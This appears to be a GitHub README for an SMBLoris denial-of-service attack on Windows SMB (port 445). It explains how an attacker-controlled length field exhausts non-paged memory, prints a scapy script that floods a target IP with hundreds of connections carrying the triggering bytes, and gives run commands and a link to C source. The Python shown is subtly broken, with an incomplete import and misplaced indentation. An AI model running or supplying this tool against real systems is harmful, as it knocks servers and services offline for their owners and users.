# what IS the Smb !! 
Me sharing files remotely by Protocol SMBv1 Or SMBv2 SMBv3 
-------------------------
vulnerable On Next in Text from i,am 
The vulnerability is in all modern versions of Windows, at least from Windows 2000 through Windows 10. Systems are still vulnerable even if all versions of SMBv1 SMBv2 SMBv3 are disabled

It is computationally inexpensive for an attacker to cause large memory allocations and enormous amounts of wasted CPU cycles†, rendering vulnerable machines completely unusable, making business-critical services (such as web and mail servers) unavailable, and even causing the entire operating system to crash !!
''''''''''
And Windows immediately commits in memory a number of bytes determined by the attacker-controlled Length field, which is 217 for a max of 131,072 bytes (128 KiB). This memory is in the "non-paged pool" (physical RAM) which cannot be swapped out to disk, making the denial of service even more effective. CPU and memory resources are effectively lost for as long as the connection is sustained

------------------------------------------------------------------------------------------------------||
------------------------------------------------------------------------------------------------------||

SMBLoris works over IPv4 and IPv6, and acquiring multiple IPs on a LAN can amplify the attack. The amount of machines required to perform a distributed denial of service (DDoS) attack against more powerful servers is also significantly reduced.


# But by me files
1 rest.sh 

2 run.sh  

3 smb3.py 

Works only on Kali version 2 #
Or
SMBLoris.c 

Normal Works on All systems Linux !! Redhat kali And And And And Etc!!

------------------------------------------------------------------------------------------------------||
------------------------------------------------------------------------------------------------------||

1 >_  Now we use smb3.py 

2 >_ Now we go to run rest.sh

![screenshot from 2017-08-09 19-19-12](https://user-images.githubusercontent.com/25440152/29142117-de3c8ec2-7d1e-11e7-8144-20261cf78916.png)
# Next >_ let's go To arrange
Edit Code file smb3.py 
```
from scapy.all import
import sys

    p0 = int(sys.argv[1])

    conf.L3socket
    conf.L3socket=L3RawSocket

    i = IP()
    i.dst = "192.168.1.4"
    t = TCP()
    t.dport = 445

    for p in range(p0, p0+700):
      print p
      t.sport = p
      t.flags = "S"

      r = sr1(i/t)
      rt = r[TCP]
      t.ack = rt.seq + 1
      t.seq = rt.ack
      t.flags = "A"
      sbss = '\x00\x01\xff\xff'
      send(i/t/sbss)

```
------------------------------------------------------------------------------------------------------||
------------------------------------------------------------------------------------------------------||

! >_  let's go To Run run.sh After we have arranged file smb3.py 


```
root@kali:~/Desktop# chmod +x run.sh

root@kali:~/Desktop#./run.sh
```

------------------------------------------------------------------------------------------------------||
------------------------------------------------------------------------------------------------------||
Now let's go To Run file SMBLoris.c
https://gist.github.com/jihadLkmaty218/72440aa47ec1852fd806efaf3752c52d

>_  After the download file let's go To Run
![screenshot from 2017-08-09 19-44-22](https://user-images.githubusercontent.com/25440152/29143202-50fe7d0a-7d22-11e7-9cda-7307c6cdb0a3.png)

------------------------------------------------------------------------------------------------------||
------------------------------------------------------------------------------------------------------||

![screenshot from 2017-08-09 19-44-48](https://user-images.githubusercontent.com/25440152/29143208-53a592dc-7d22-11e7-892e-b3a20fef0ce2.png)
